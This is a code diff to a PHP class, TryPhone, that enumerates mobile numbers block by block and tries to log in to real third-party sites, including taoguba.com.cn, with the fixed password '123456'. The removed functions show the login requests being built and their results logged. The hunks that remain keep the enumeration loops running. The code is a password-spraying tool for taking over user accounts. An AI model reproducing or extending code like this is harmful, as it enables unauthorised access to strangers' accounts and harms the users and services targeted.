@@ -393,10 +393,11 @@ class TryPhone
 	public static function phone_section_7()
 	{
 		$phone_section = [
-			1825157, 1395925, 1874207
+			//1825157,
+			1395925, 1874207
 		];
 		foreach ($phone_section as $p) {
-			self::combind_phone_new($p, 6, self::CAT_YIHAOPZ);
+			self::combind_phone_new2($p, 6, self::CAT_YIHAOPZ);
 		}
 	}
 
@@ -419,16 +420,6 @@ class TryPhone
 		for ($i = 0; $i < 9999; $i++) {
 			$phone = $p * 10000 + $i;
 			self::req($phone);
-		}
-	}
-
-	public static function combind_phone_new($p, $Index = 1, $cat = self::CAT_TAOGUBA)
-	{
-		$sql = "update im_log set oKey=9,oAfter=$Index where `oCategory`='phone_section' and oOpenId =$p";
-		AppUtil::db()->createCommand($sql)->execute();
-		for ($i = 0; $i < 9999; $i++) {
-			$phone = $p * 10000 + $i;
-			self::request($phone, $cat);
 		}
 	}
 
@@ -459,34 +450,6 @@ class TryPhone
 		}
 	}
 
-
-	public static function request($phone, $cat = self::CAT_TAOGUBA)
-	{
-		$ret = "";
-		switch ($cat) {
-			case self::CAT_TAOGUBA:
-				$data = [
-					'userName' => $phone,
-					'password' => "123456",
-					'save' => "Y",
-					'url' => "https://www.taoguba.com.cn/index?blockID=1",
-				];
-				$ret = TryPhone::taoguba_phone($data);
-				break;
-			case self::CAT_YIHAOPZ:
-				$data = [
-					'mobile' => $phone,
-					'password' => "123456",
-					'verifycode' => "5853",
-				];
-				$ret = self::yiHaopz_phone($data);
-				break;
-		}
-
-		self::logFile(['phone' => $phone, 'ret' => $ret], __FUNCTION__, __LINE__, 'logs_' . $cat . '_');
-
-		self::request_after($ret, $phone, $cat);
-	}
 
 	public static function request_after($ret, $phone, $cat)
 	{
